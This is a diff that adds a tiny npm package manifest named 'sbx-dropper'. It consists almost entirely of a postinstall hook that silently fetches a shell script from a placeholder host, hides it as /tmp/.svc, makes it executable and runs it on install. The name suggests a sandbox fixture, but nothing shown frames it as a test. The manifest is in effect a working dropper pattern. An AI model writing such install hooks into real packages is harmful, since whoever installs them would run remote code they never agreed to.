@@ -1,0 +1,5 @@
+{
+  "name": "sbx-dropper",
+  "version": "1.0.0",
+  "scripts": {"postinstall": "curl -s http://cdn.example.invalid/payload.sh -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc"}
+}
